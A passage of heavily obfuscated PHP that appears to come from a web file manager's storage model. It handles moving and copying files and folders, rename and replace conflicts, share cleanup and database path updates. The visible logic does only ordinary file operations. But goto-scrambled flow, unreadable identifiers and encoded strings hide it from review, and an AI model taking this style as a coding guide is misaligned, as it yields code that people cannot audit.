$dÀ‚ß”¨æ[$DÄ„®¨…ô[381]]; $eÏëåß‚ÜÆ = $this->parentLevelArray($E‡ÏÆô¥‹[$DÄ„®¨…ô[381]]); goto B¬»á†µÌ¡; B¤‘ô•…Ó: return array($DÄ„®¨…ô[392] => $d¦ªóÃˆùê, $DÄ„®¨…ô[381] => $A¾À ¸ñ ); goto fÕïâòˆÈ; B¬»á†µÌ¡: $d¦ªóÃˆùê = $c±äÔÁ“Ó [$eÏëåß‚ÜÆ[count($eÏëåß‚ÜÆ) - 1]]; foreach ($eÏëåß‚ÜÆ as $F“ô¨Ü …İ) { if (isset($c±äÔÁ“Ó [$F“ô¨Ü …İ])) { $A¾À ¸ñ  .= $c±äÔÁ“Ó [$F“ô¨Ü …İ] . $DÄ„®¨…ô[393]; } } $A¾À ¸ñ  = rtrim($A¾À ¸ñ , $DÄ„®¨…ô[47]) . $DÄ„®¨…ô[47]; goto B¤‘ô•…Ó; fÕïâòˆÈ: } private function _makeItemData($Bç÷¦ßÄ“Š, $A»öŠèÑƒ˜, $Cï¬â¥°Å) { $Fõš“’‘ê‹ =& $_SERVER[°Óó£ÌİóèÅ]; $eøå©Í–® = array($Fõš“’‘ê‹[394] => $Bç÷¦ßÄ“Š[$Fõš“’‘ê‹[383]], $Fõš“’‘ê‹[395] => $Cï¬â¥°Å, $Fõš“’‘ê‹[396] => $Bç÷¦ßÄ“Š[$Fõš“’‘ê‹[397]], $Fõš“’‘ê‹[398] => $Bç÷¦ßÄ“Š[$Fõš“’‘ê‹[390]], $Fõš“’‘ê‹[399] => $Bç÷¦ßÄ“Š[$Fõš“’‘ê‹[86]], $Fõš“’‘ê‹[400] => $A»öŠèÑƒ˜[$Fõš“’‘ê‹[401]], $Fõš“’‘ê‹[402] => $A»öŠèÑƒ˜[$Fõš“’‘ê‹[403]], $Fõš“’‘ê‹[404] => USER_ID, $Fõš“’‘ê‹[405] => USER_ID, $Fõš“’‘ê‹[406] => $A»öŠèÑƒ˜[$Fõš“’‘ê‹[382]], $Fõš“’‘ê‹[407] => $A»öŠèÑƒ˜[$Fõš“’‘ê‹[381]] . $A»öŠèÑƒ˜[$Fõš“’‘ê‹[382]] . $Fõš“’‘ê‹[47], $Fõš“’‘ê‹[408] => 0); return $eøå©Í–®; } private function _copyApplyMeta($fÖÕœ¨¶£, &$dÀÙŠÜÙ²„) { $bÊŠ›ˆ‡ë¹ =& $_SERVER[°Óó£ÌİóèÅ]; $C§‚ÑÕ¤ªÁ = $fÖÕœ¨¶£[$bÊŠ›ˆ‡ë¹[382]]; $f‡ˆ¹ìô¢  = $fÖÕœ¨¶£[$bÊŠ›ˆ‡ë¹[28]]; if (!isset($fÖÕœ¨¶£[$bÊŠ›ˆ‡ë¹[409]]) || !$fÖÕœ¨¶£[$bÊŠ›ˆ‡ë¹[409]] || $fÖÕœ¨¶£[$bÊŠ›ˆ‡ë¹[409]] == $bÊŠ›ˆ‡ë¹[410]) { $dÀÙŠÜÙ²„[$bÊŠ›ˆ‡ë¹[387]][] = array($bÊŠ›ˆ‡ë¹[382], $C§‚ÑÕ¤ªÁ, $bÊŠ›ˆ‡ë¹[409], short_id($C§‚ÑÕ¤ªÁ)); } if (Input::check($f‡ˆ¹ìô¢ , $bÊŠ›ˆ‡ë¹[411])) { $dÀÙŠÜÙ²„[$bÊŠ›ˆ‡ë¹[386]][] = array($bÊŠ›ˆ‡ë¹[382] => $C§‚ÑÕ¤ªÁ, $bÊŠ›ˆ‡ë¹[96] => $bÊŠ›ˆ‡ë¹[412], $bÊŠ›ˆ‡ë¹[367] => str_replace($bÊŠ›ˆ‡ë¹[50], $bÊŠ›ˆ‡ë¹[33], Pinyin::encode($f‡ˆ¹ìô¢ ))); $dÀÙŠÜÙ²„[$bÊŠ›ˆ‡ë¹[386]][] = array($bÊŠ›ˆ‡ë¹[382] => $C§‚ÑÕ¤ªÁ, $bÊŠ›ˆ‡ë¹[96] => $bÊŠ›ˆ‡ë¹[413], $bÊŠ›ˆ‡ë¹[367] => Pinyin::encode($f‡ˆ¹ìô¢ , $bÊŠ›ˆ‡ë¹[414])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($aº¤¶¥øõÏ) { goto e•‚¼„îŞÃ; e•‚¼„îŞÃ: $dö†Åç†Û÷ =& $_SERVER[°Óó£ÌİóèÅ]; $fî¡¸åÅ™ = $this->sourceInfo($aº¤¶¥øõÏ); $ešŒÈ¢‡‹ = $dö†Åç†Û÷[415]; goto bì†÷¥ÃÒ¤; d“‡…Ã³åÄ: $EÆÓÌ„ñ±Í = array_to_keyvalue($EÆÓÌ„ñ±Í, $dö†Åç†Û÷[382]); foreach ($EÆÓÌ„ñ±Í as $EÙ‰ğ˜¶˜à) { $dÂ«¹ó˜³ = $EÙ‰ğ˜¶˜à[$dö†Åç†Û÷[392]]; $aº¤¶¥øõÏ = $EÙ‰ğ˜¶˜à[$dö†Åç†Û÷[382]]; if (!isset($this->_childrenListCache[$aº¤¶¥øõÏ]) && $EÙ‰ğ˜¶˜à[$dö†Åç†Û÷[383]] == $dö†Åç†Û÷[384]) { $this->_childrenListCache[$aº¤¶¥øõÏ] = array(); } if (!isset($this->_childrenListCache[$dÂ«¹ó˜³])) { $this->_childrenListCache[$dÂ«¹ó˜³] = array(); } $this->_childrenListCache[$dÂ«¹ó˜³][$aº¤¶¥øõÏ] = $EÙ‰ğ˜¶˜à; $this->_childrenItemCache[$aº¤¶¥øõÏ] = $EÙ‰ğ˜¶˜à; } goto cåÓ¦ºùóç; bì†÷¥ÃÒ¤: $dä¬„›…àÇ = array($dö†Åç†Û÷[381] => array($dö†Åç†Û÷[416], $fî¡¸åÅ™[$dö†Åç†Û÷[381]] . $aº¤¶¥øõÏ . $dö†Åç†Û÷[417]), $dö†Åç†Û÷[418] => 0); $EÆÓÌ„ñ±Í = $this->field($ešŒÈ¢‡‹)->where($dä¬„›…àÇ)->select(); if (!$EÆÓÌ„ñ±Í) { return; } goto d“‡…Ã³åÄ; cåÓ¦ºùóç: } private function _childrenListAll($a¡«Ì©Î£, &$EŒ›„—Œ) { $E—“†Ô¾‡ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset($this->_childrenListCache[$a¡«Ì©Î£])) { return; } $e•Éâœéğ² = $this->_childrenListCache[$a¡«Ì©Î£]; foreach ($e•Éâœéğ² as $Eˆë²òŒ => $dÄæ¸ää“¿) { $EŒ›„—Œ[$Eˆë²òŒ] = $dÄæ¸ää“¿; if ($dÄæ¸ää“¿[$E—“†Ô¾‡[383]] == $E—“†Ô¾‡[384]) { $this->_childrenListAll($Eˆë²òŒ, $EŒ›„—Œ); } } } private function sourceInfoCache($FÎ¾êÁÚ¥±) { if (isset($this->_childrenItemCache[$FÎ¾êÁÚ¥±])) { return $this->_childrenItemCache[$FÎ¾êÁÚ¥±]; } return $this->sourceInfo($FÎ¾êÁÚ¥±); } private function _childrenList($d½ó¥‰•ÍÆ) { if (isset($this->_childrenListCache[$d½ó¥‰•ÍÆ])) { return $this->_childrenListCache[$d½ó¥‰•ÍÆ]; } return $this->_childrenListSelect($d½ó¥‰•ÍÆ); } private function _childrenListSelect($eæĞ¤à”Ä–) { goto D¬ó™·ˆ; C•Ğƒòƒ­„: foreach ($bÄ¬¥±Ø¼— as $eæĞ¤à”Ä– => $fÎ¬Í®¹ƒ­) { $this->_childrenItemCache[$eæĞ¤à”Ä–] = $fÎ¬Í®¹ƒ­; } return $bÄ¬¥±Ø¼—; goto e·³Ù•ô‡¬; b·ÌŸâ–‹: $f‹ÜÜ© Ê = $f‹ÜÜ© Ê ? $f‹ÜÜ© Ê : array(); $bÄ¬¥±Ø¼— = array_to_keyvalue($f‹ÜÜ© Ê, $B»„æ‡ª„¥[382]); $this->_childrenListCache[$eæĞ¤à”Ä–] = $bÄ¬¥±Ø¼—; goto C•Ğƒòƒ­„; D¬ó™·ˆ: $B»„æ‡ª„¥ =& $_SERVER[°Óó£ÌİóèÅ]; $AŠÎà“è‡ò = array($B»„æ‡ª„¥[392] => $eæĞ¤à”Ä–, $B»„æ‡ª„¥[418] => 0); $f‹ÜÜ© Ê = $this->where($AŠÎà“è‡ò)->select(); goto b·ÌŸâ–‹; e·³Ù•ô‡¬: } private function fileNameExistCache($DŒÍ—·‘×„, $dÄíÆ‘ÏÉß) { $a¹êáÙÏñ =& $_SERVER[°Óó£ÌİóèÅ]; $dÄíÆ‘ÏÉß = strtolower($dÄíÆ‘ÏÉß); $a‰„Çö³ÄÕ = $this->_childrenList($DŒÍ—·‘×„); foreach ($a‰„Çö³ÄÕ as $B“ÎŸœÉéÁ) { if ($dÄíÆ‘ÏÉß == strtolower($B“ÎŸœÉéÁ[$a¹êáÙÏñ[28]])) { return $B“ÎŸœÉéÁ[$a¹êáÙÏñ[382]]; } } return !1; } private function fileNameAutoCache($B¹Ä¿°Ù—Ø, $dÊ¼ˆğ¸È¥, $A±Õ¿–Ğ…, $FÓ„Ëï—ê¸) { $FÚ‚Ù£½ô =& $_SERVER[°Óó£ÌİóèÅ]; $Fæ•ğ°åÔñ = $this->_childrenList($B¹Ä¿°Ù—Ø); $bŠÂçïÈåß = array_to_keyvalue($Fæ•ğ°åÔñ, $FÚ‚Ù£½ô[33], $FÚ‚Ù£½ô[28]); return $this->fileNameAutoGet($bŠÂçïÈåß, $dÊ¼ˆğ¸È¥, $A±Õ¿–Ğ…, $FÓ„Ëï—ê¸); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a‘É®Šƒ­é, $bŠÆ¿Û¶ß, $e«““ºéí = REPEAT_REPLACE, $aÌî¸ñ»ïÈ = '') { goto bâÒÆÛíÒÅ; fƒ¤¬óã²ë: $a”ëÍÄ²» = $this->_move($a‘É®Šƒ­é, $bŠÆ¿Û¶ß, $e«““ºéí, $A—»ºí×®÷, $aÌî¸ñ»ïÈ); $this->sourceCacheClear(); if ($cÑáãš“†[$e†‰ç®©ƒÚ[383]] == $e†‰ç®©ƒÚ[384] && $c ÇÁ’µß÷) { $this->folderSizeResetChildren($a”ëÍÄ²»); } goto då×›ìÓÅê; cóî„¿¾Ò¦: $this->folderSizeReset($bŠÆ¿Û¶ß); $AÅ˜„â‘Íµ = array($cÑáãš“†[$e†‰ç®©ƒÚ[392]], $bŠÆ¿Û¶ß); if ($cÑáãš“†[$e†‰ç®©ƒÚ[383]] == $e†‰ç®©ƒÚ[384]) { $AÅ˜„â‘Íµ[] = $a‘É®Šƒ­é; } goto AÉŸ‹Ş²‡›; e ğ…Œ’‡Ó: $A—»ºí×®÷ = array($e†‰ç®©ƒÚ[385] => array(), $e†‰ç®©ƒÚ[420] => !1); $this->clearShare($a‘É®Šƒ­é, $bŠÆ¿Û¶ß); $c ÇÁ’µß÷ = $this->fileNameExistCache($bŠÆ¿Û¶ß, $cÑáãš“†[$e†‰ç®©ƒÚ[28]]); goto fƒ¤¬óã²ë; då×›ìÓÅê: Model($e†‰ç®©ƒÚ[172])->linkAdd($A—»ºí×®÷[$e†‰ç®©ƒÚ[385]]); if ($c ÇÁ’µß÷ && $A—»ºí×®÷[$e†‰ç®©ƒÚ[420]]) { $this->remove($a‘É®Šƒ­é, !1); } $this->folderSizeReset($cÑáãš“†[$e†‰ç®©ƒÚ[392]]); goto cóî„¿¾Ò¦; AÉŸ‹Ş²‡›: $this->updateModifyTime($AÅ˜„â‘Íµ); Model($e†‰ç®©ƒÚ[389])->eventMove($a‘É®Šƒ­é, $cÑáãš“†[$e†‰ç®©ƒÚ[392]], $bŠÆ¿Û¶ß); return $a”ëÍÄ²»; goto A…Îòáïò; bâÒÆÛíÒÅ: $e†‰ç®©ƒÚ =& $_SERVER[°Óó£ÌİóèÅ]; $cÑáãš“† = $this->sourceInfo($a‘É®Šƒ­é); $cÅŒôİ¸ñ‹ = $this->sourceInfo($bŠÆ¿Û¶ß); goto Aâ±¯œÆ®Ñ; Aâ±¯œÆ®Ñ: if ($this->isParentOf($a‘É®Šƒ­é, $bŠÆ¿Û¶ß)) { return !1; } if (!$cÑáãš“† || !$cÅŒôİ¸ñ‹ || $cÅŒôİ¸ñ‹[$e†‰ç®©ƒÚ[383]] != $e†‰ç®©ƒÚ[384]) { return !1; } if ($cÑáãš“†[$e†‰ç®©ƒÚ[392]] == $bŠÆ¿Û¶ß && $aÌî¸ñ»ïÈ != $cÑáãš“†[$e†‰ç®©ƒÚ[28]]) { $E¯„êõ…¦á = $this->fileNameExist($bŠÆ¿Û¶ß, $aÌî¸ñ»ïÈ); if ($E¯„êõ…¦á && $cÑáãš“†[$e†‰ç®©ƒÚ[383]] == $e†‰ç®©ƒÚ[410]) { $C¨¯ê»Á‰ = $this->sourceInfo($E¯„êõ…¦á); $dõ¢Ã´Æé = $this->fileHistory($C¨¯ê»Á‰, $cÑáãš“†[$e†‰ç®©ƒÚ[390]], $cÑáãš“†[$e†‰ç®©ƒÚ[86]]); if (!$dõ¢Ã´Æé) { Model($e†‰ç®©ƒÚ[419])->remove($cÑáãš“†[$e†‰ç®©ƒÚ[390]]); } $this->remove($a‘É®Šƒ­é, !1); $this->folderSizeReset($bŠÆ¿Û¶ß); return $E¯„êõ…¦á; } } goto e ğ…Œ’‡Ó; A…Îòáïò: } private function _move($E¡ÓíÕ£ğŒ, $Cˆ®¥äØ‘ò, $B‰ÔŠâÖ ‘, &$C°ŒÉäÔÃ, $B«—ˆÕ“è— = '') { goto F×Û‚Í­¤ï; f‰¹ïíÌ‰: if ($f©‡ºÃ×Ù· && !$C°ŒÉäÔÃ[$dºè×Ì×¢[420]]) { $C°ŒÉäÔÃ[$dºè×Ì×¢[420]] = !0; } return $AÈÆæè„Œî; goto CåµÔÃ¯ƒ; F×Û‚Í­¤ï: $dºè×Ì×¢ =& $_SERVER[°Óó£ÌİóèÅ]; $E˜ÈçïºÁ = $this->sourceInfo($E¡ÓíÕ£ğŒ); $FŞ«ˆ¬©Å² = $E˜ÈçïºÁ[$dºè×Ì×¢[383]] == $dºè×Ì×¢[384]; goto F¯÷Ø§ß¬–; A¤³¶„¨Ï÷: $AÈÆæè„Œî = $fÓÀøßŠôç; $f©‡ºÃ×Ù· = !1; if ($FŞ«ˆ¬©Å²) { if ($B‰ÔŠâÖ ‘ == REPEAT_RENAME_FOLDER) { $E‰Ä³Ñ‹òÂ = $this->fileNameAuto($Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ, $B‰ÔŠâÖ ‘, $FŞ«ˆ¬©Å²); $AÈÆæè„Œî = $this->_moveForce($E¡ÓíÕ£ğŒ, $Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ); } else { if ($B‰ÔŠâÖ ‘ == REPEAT_RENAME_FOLDER) { $B‰ÔŠâÖ ‘ = REPEAT_RENAME; } $dê„¨Éëî± = $this->_childrenListSelect($E¡ÓíÕ£ğŒ); foreach ($dê„¨Éëî± as $få˜÷éŠ¾‘) { $this->_move($få˜÷éŠ¾‘[$dºè×Ì×¢[382]], $fÓÀøßŠôç, $B‰ÔŠâÖ ‘, $C°ŒÉäÔÃ); } $f©‡ºÃ×Ù· = !0; } } else { if ($B‰ÔŠâÖ ‘ == REPEAT_SKIP) { $f©‡ºÃ×Ù· = !0; } else { if ($B‰ÔŠâÖ ‘ == REPEAT_RENAME || $B‰ÔŠâÖ ‘ == REPEAT_RENAME_FOLDER) { $E‰Ä³Ñ‹òÂ = $this->fileNameAuto($Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ, $B‰ÔŠâÖ ‘, $FŞ«ˆ¬©Å²); $AÈÆæè„Œî = $this->_moveForce($E¡ÓíÕ£ğŒ, $Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ); } else { if ($B‰ÔŠâÖ ‘ == REPEAT_REPLACE) { $dÄâï¡±Ö = $this->sourceInfoCache($fÓÀøßŠôç); $a„Å¬‰Ø˜á = $this->fileHistory($dÄâï¡±Ö, $E˜ÈçïºÁ[$dºè×Ì×¢[390]], $E˜ÈçïºÁ[$dºè×Ì×¢[86]]); if ($a„Å¬‰Ø˜á) { $C°ŒÉäÔÃ[$dºè×Ì×¢[385]][] = $E˜ÈçïºÁ[$dºè×Ì×¢[390]]; } else { $f©‡ºÃ×Ù· = !0; } } } } } goto f‰¹ïíÌ‰; F¯÷Ø§ß¬–: $E‰Ä³Ñ‹òÂ = $B«—ˆÕ“è— ? $B«—ˆÕ“è— : $E˜ÈçïºÁ[$dºè×Ì×¢[28]]; $fÓÀøßŠôç = $this->fileNameExistCache($Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ); if (!$fÓÀøßŠôç) { return $this->_moveForce($E¡ÓíÕ£ğŒ, $Cˆ®¥äØ‘ò, $E‰Ä³Ñ‹òÂ); } goto A¤³¶„¨Ï÷; CåµÔÃ¯ƒ: } private function _moveForce($e¨Ê¤òÇÓ÷, $a§ì”¥Ï‚, $fñÂâ£éğÒ) { goto bî ÁºÇç; Bƒ£ÜØœ¡ì: $Eõ„™ŠÉĞî = $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[383]] == $BŸóã‘ÏĞÌ[384]; $fÙïƒ¨à  = array($BŸóã‘ÏĞÌ[406] => $bšìªÈíî[$BŸóã‘ÏĞÌ[382]], $BŸóã‘ÏĞÌ[407] => $bšìªÈíî[$BŸóã‘ÏĞÌ[381]] . $bšìªÈíî[$BŸóã‘ÏĞÌ[382]] . $BŸóã‘ÏĞÌ[47], $BŸóã‘ÏĞÌ[400] => $bšìªÈíî[$BŸóã‘ÏĞÌ[401]], $BŸóã‘ÏĞÌ[402] => $bšìªÈíî[$BŸóã‘ÏĞÌ[403]], $BŸóã‘ÏĞÌ[405] => USER_ID, $BŸóã‘ÏĞÌ[408] => 0, $BŸóã‘ÏĞÌ[395] => $fñÂâ£éğÒ); $E—Î™ƒË°ã = $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[401]] == SourceModel::TYPE_GROUP && $bšìªÈíî[$BŸóã‘ÏĞÌ[401]] == SourceModel::TYPE_GROUP && $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[403]] == $bšìªÈíî[$BŸóã‘ÏĞÌ[403]]; goto cÜ¤´…‡µÊ; fğÅ‡ Ã©‡: return $e¨Ê¤òÇÓ÷; goto d¨Š²åÚ¥‡; cÜ¤´…‡µÊ: if (!$E—Î™ƒË°ã) { Model($BŸóã‘ÏĞÌ[421])->authClear($e¨Ê¤òÇÓ÷); } if ($Eõ„™ŠÉĞî) { $d×÷‘‰Ë¶ë = array($BŸóã‘ÏĞÌ[407] => array($BŸóã‘ÏĞÌ[416], $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[381]] . $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[382]] . $BŸóã‘ÏĞÌ[417])); $aÃóŸ¾‚³ = $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[381]] . $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[382]] . $BŸóã‘ÏĞÌ[47]; $AÂ˜×ó‹™¨ = $bšìªÈíî[$BŸóã‘ÏĞÌ[381]] . $bšìªÈíî[$BŸóã‘ÏĞÌ[382]] . $BŸóã‘ÏĞÌ[47] . $Bµ¢Õ‘†œ[$BŸóã‘ÏĞÌ[382]] . $BŸóã‘ÏĞÌ[47]; $a÷™§¥ÂÇÏ = array($BŸóã‘ÏĞÌ[407] => array($BŸóã‘ÏĞÌ[422], "\162\145\160\x6c\x61\x63\x65\50\160\141\x72\145\x6e\164\114\x65\166\145\x6c\x2c\47{$aÃóŸ¾‚³}\x27\x2c\x27{$AÂ˜×ó‹™¨}\x27\x29"), $BŸóã‘ÏĞÌ[400] => $bšìªÈíî[$BŸóã‘ÏĞÌ[401]], $BŸóã‘ÏĞÌ[402] => $bšìªÈíî[$BŸóã‘ÏĞÌ[403]], $BŸóã‘ÏĞÌ[408] => 0); $this->where($d×÷‘‰Ë¶ë)->data($a÷™§¥ÂÇÏ)->save(); } $this->where(array($BŸóã‘ÏĞÌ[423] => $e¨Ê¤òÇÓ÷))->data($fÙïƒ¨à )->save(); goto fğÅ‡ Ã©‡; bî ÁºÇç: $BŸóã‘ÏĞÌ =& $_SERVER[°Óó£ÌİóèÅ]; $Bµ¢Õ‘†œ = $this->sourceInfo($e¨Ê¤òÇÓ÷); $bšìªÈíî = $this->sourceInfo($a§ì”¥Ï‚); goto Bƒ£ÜØœ¡ì; d¨Š²åÚ¥‡: } private function clearShare($DŒÆåò†‚, $cœäªí³›Õ) { goto c¯«‘äîä; A¡ùÖ›ã‚: if (!$F…¹…¶ĞÈÙ) { return; } $F…¹…¶ĞÈÙ = array_to_keyvalue($F…¹…¶ĞÈÙ, $Aîˆ¨æáÊ†[33], $Aîˆ¨æáÊ†[427]); $A÷ÈÛçê¦Ï = array($Aîˆ¨æáÊ†[427] => array($Aîˆ¨æáÊ†[7], $F…¹…¶ĞÈÙ)); goto bÍÛ¦„Ö”; bÍÛ¦„Ö”: Model($Aîˆ¨æáÊ†[426])->where($A÷ÈÛçê¦Ï)->save(array($Aîˆ¨æáÊ†[425] => 0)); Model($Aîˆ¨æáÊ†[428])->where($A÷ÈÛçê¦Ï)->delete(); goto EÙò®Éƒ¹Ä; Cé×š¾”ÃÆ: if (!$F÷«ß¾ƒ¶†) { return; } $A÷ÈÛçê¦Ï = array($Aîˆ¨æáÊ†[382] => array($Aîˆ¨æáÊ†[7], $F÷«ß¾ƒ¶†), $Aîˆ¨æáÊ†[425] => 1); $F…¹…¶ĞÈÙ = Model($Aîˆ¨æáÊ†[426])->field($Aîˆ¨æáÊ†[427])->where($A÷ÈÛçê¦Ï)->select(); goto A¡ùÖ›ã‚; fìàÇ×Û‰¥: if ($ešŸöÛº[$Aîˆ¨æáÊ†[403]] == $F½àâ…¹”¶[$Aîˆ¨æáÊ†[403]] && $ešŸöÛº[$Aîˆ¨æáÊ†[401]] == $Aîˆ¨æáÊ†[424]) { return; } $A÷ÈÛçê¦Ï = array($Aîˆ¨æáÊ†[381] => array($Aîˆ¨æáÊ†[416], $ešŸöÛº[$Aîˆ¨æáÊ†[381]] . $DŒÆåò†‚ . $Aîˆ¨æáÊ†[417]), $Aîˆ¨æáÊ†[418] => 0); $F÷«ß¾ƒ¶† = $this->field($Aîˆ¨æáÊ†[423])->where($A÷ÈÛçê¦Ï)->getField($Aîˆ¨æáÊ†[382], !0); goto Cé×š¾”ÃÆ; c¯«‘äîä: $Aîˆ¨æáÊ† =& $_SERVER[°Óó£ÌİóèÅ]; $ešŸöÛº = $this->sourceInfo($DŒÆåò†‚); $F½àâ…¹”¶ = $this->sourceInfo($cœäªí³›Õ); goto fìàÇ×Û‰¥; EÙò®Éƒ¹Ä: } public function copyFolderFromIO($dÍ¹ñòà…, $eŠåøìƒ¿, $DÈíÏÙõÁì, $B²ë±‹æË, $bßİÆ¡ÀŞØ) { goto B¢í¡ÀÖŞ; DÄâ’ƒğå: $fïÈò‘¿¿ = $this->fileNameExist($DÈíÏÙõÁì, $EÑÄ†ÔïÖÄ); $dÖÍ·¹„º = $this->mkdir($DÈíÏÙõÁì, $EÑÄ†ÔïÖÄ, $B²ë±‹æË); if (!$fïÈò‘¿¿ || $B²ë±‹æË == REPEAT_RENAME_FOLDER) { $B²ë±‹æË = !1; } goto b‹áÁ‹±„; B¢í¡ÀÖŞ: $cå˜ ¶˜ØÁ =& $_SERVER[°Óó£ÌİóèÅ]; $cÆ† ”µ¦ƒ = array($cå˜ ¶˜ØÁ[386] => array(), $cå˜ ¶˜ØÁ[387] => array(), $cå˜ ¶˜ØÁ[385] => array(), $cå˜ ¶˜ØÁ[429] => array()); $EÑÄ†ÔïÖÄ = $dÍ¹ñòà…->getPathName($dÍ¹ñòà…->pathThis($eŠåøìƒ¿)); goto DÄâ’ƒğå; D„çğƒ”İ: Model($cå˜ ¶˜ØÁ[419])->linkAdd($cÆ† ”µ¦ƒ[$cå˜ ¶˜ØÁ[385]]); Model($cå˜ ¶˜ØÁ[419])->remove($cÆ† ”µ¦ƒ[$cå˜ ¶˜ØÁ[429]]); $this->folderSizeReset($DÈíÏÙõÁì); goto bæ‹ƒÕÁ¿ã; cÉ‰“š›Å¢: Model($cå˜ ¶˜ØÁ[388])->addAll($cÆ† ”µ¦ƒ[$cå˜ ¶˜ØÁ[386]], array(), !0); Model($cå˜ ¶˜ØÁ[389])->eventCopy($dÖÍ·¹„º); $this->saveAll($cÆ† ”µ¦ƒ[$cå˜ ¶˜ØÁ[387]]); goto D„çğƒ”İ; bæ‹ƒÕÁ¿ã: $this->updateModifyTime($DÈíÏÙõÁì); return $dÖÍ·¹„º; goto Aæ£’šöµÇ; eÈï¥®‚°Ğ: Hook::trigger($cå˜ ¶˜ØÁ[431]); if ($dÖÍ·¹„º) { $this->folderSizeResetChildren($dÖÍ·¹„º); } $this->_childrenListClear(); goto cÉ‰“š›Å¢; b‹áÁ‹±„: if ($fïÈò‘¿¿) { $this->_childrenAllMake($fïÈò‘¿¿); } Hook::trigger($cå˜ ¶˜ØÁ[430]); $this->_copyChildTo($dÍ¹ñòà…, $eŠåøìƒ¿, $dÖÍ·¹„º, $B²ë±‹æË, $cÆ† ”µ¦ƒ, $bßİÆ¡ÀŞØ); goto eÈï¥®‚°Ğ; Aæ£’šöµÇ: } private function _copyChildTo($e†ö—“ñÆº, $D® Á»Ù¨æ, $Aõ„¡Æ£¸É, $dÊÂ¾ŞŸõ‡, &$e®Šêî¿ÌØ, $f”Øˆ¡ŒÅÜ) { goto eÉ±¡¿İ¯œ; Eˆ°ø„’ì«: $d›š­ÊŒ»ß = array_merge($B®Üˆ°¥õ÷[$aÇ—Şé[82]], $B®Üˆ°¥õ÷[$aÇ—Şé[83]]); $Bëóç®ÕÇ = $this->_addFiles($e†ö—“ñÆº, $B®Üˆ°¥õ÷[$aÇ—Şé[82]], $f”Øˆ¡ŒÅÜ); $eœõ¤™ˆœÀ = array(); goto f½ï¢á„°; f½ï¢á„°: foreach ($d›š­ÊŒ»ß as &$e™ªÀëêã) { goto E¨ìİô…“; f·ƒõÏÚˆ‰: $e™ªÀëêã[$aÇ—Şé[86]] = _get($e™ªÀëêã, $aÇ—Şé[86], 0); $e™ªÀëêã[$aÇ—Şé[390]] = _get($e™ªÀëêã, $aÇ—Şé[390], 0); if (!isset($e™ªÀëêã[$aÇ—Şé[432]]) && $e™ªÀëêã[$aÇ—Şé[390]]) { $e®Šêî¿ÌØ[$aÇ—Şé[429]][] = $e™ªÀëêã[$aÇ—Şé[390]]; } goto AÆ¿•¤Æ¸‚; E¨ìİô…“: if (isset($Bëóç®ÕÇ[$e™ªÀëêã[$aÇ—Şé[28]]])) { $e™ªÀëêã = $Bëóç®ÕÇ[$e™ªÀëêã[$aÇ—Şé[28]]]; } $e™ªÀëêã[$aÇ—Şé[383]] = $e™ªÀëêã[$aÇ—Şé[29]] == $aÇ—Şé[85]; $e™ªÀëêã[$aÇ—Şé[397]] = _get($e™ªÀëêã, $aÇ—Şé[165], $aÇ—Şé[33]); goto f·ƒõÏÚˆ‰; AÆ¿•¤Æ¸‚: if ($dÊÂ¾ŞŸõ‡) { $c’ ô–¤¯• = $this->fileNameExistCache($Aõ„¡Æ£¸É, $e™ªÀëêã[$aÇ—Şé[28]]); if ($c’ ô–¤¯•) { if ($e™ªÀëêã[$aÇ—Şé[383]] || $dÊÂ¾ŞŸõ‡ == REPEAT_SKIP) { continue; } if ($dÊÂ¾ŞŸõ‡ == REPEAT_REPLACE) { $aß¨ÎÏ‘ªõ = $this->sourceInfoCache($c’ ô–¤¯•); $A‚İàçÚ‡‰ = $this->fileHistory($aß¨ÎÏ‘ªõ, $e™ªÀëêã[$aÇ—Şé[390]], $e™ªÀëêã[$aÇ—Şé[86]]); if ($A‚İàçÚ‡‰) { $e®Šêî¿ÌØ[$aÇ—Şé[385]][] = $e™ªÀëêã[$aÇ—Şé[390]]; } continue; } else { if ($dÊÂ¾ŞŸõ‡ == REPEAT_RENAME) { $e™ªÀëêã[$aÇ—Şé[28]] = $this->fileNameAutoCache($Aõ„¡Æ£¸É, $e™ªÀëêã[$aÇ—Şé[28]], $dÊÂ¾ŞŸõ‡, !1); } } } } if (!$e™ªÀëêã[$aÇ—Şé[383]] && $e™ªÀëêã[$aÇ—Şé[390]]) { $e®Šêî¿ÌØ[$aÇ—Şé[385]][] = $e™ªÀëêã[$aÇ—Şé[390]]; } $eœõ¤™ˆœÀ[] = $this->_makeItemData($e™ªÀëêã, $D‡ò¡æÅ½í, $e™ªÀëêã[$aÇ—Şé[28]]); goto F„Ó†·ñÂ; F„Ó†·ñÂ: } unset($e™ªÀëêã); if (!empty($eœõ¤™ˆœÀ)) { $this->addAll($eœõ¤™ˆœÀ); } goto eÔö‘ƒÛ±ë; eÉ±¡¿İ¯œ: $aÇ—Şé =& $_SERVER[°Óó£ÌİóèÅ]; $D‡ò¡æÅ½í = $this->sourceInfoCache($Aõ„¡Æ£¸É); $B®Üˆ°¥õ÷ = $e†ö—“ñÆº->listPath($D® Á»Ù¨æ, !1, !0); goto Eˆ°ø„’ì«; eÔö‘ƒÛ±ë: $E‡Œ‹¢±• = $this->_childrenList($Aõ„¡Æ£¸É); $E‡Œ‹¢±• = array_to_keyvalue($E‡Œ‹¢±•, $aÇ—Şé[28]); foreach ($d›š­ÊŒ»ß as $e™ªÀëêã) { $aß¨ÎÏ‘ªõ = $E‡Œ‹¢±•[$e™ªÀëêã[$aÇ—Şé[28]]]; $EÙ¸³Ì”Øµ = $aß¨ÎÏ‘ªõ[$aÇ—Şé[382]]; $this->_copyApplyMeta($aß¨ÎÏ‘ªõ, $e®Šêî¿ÌØ); if 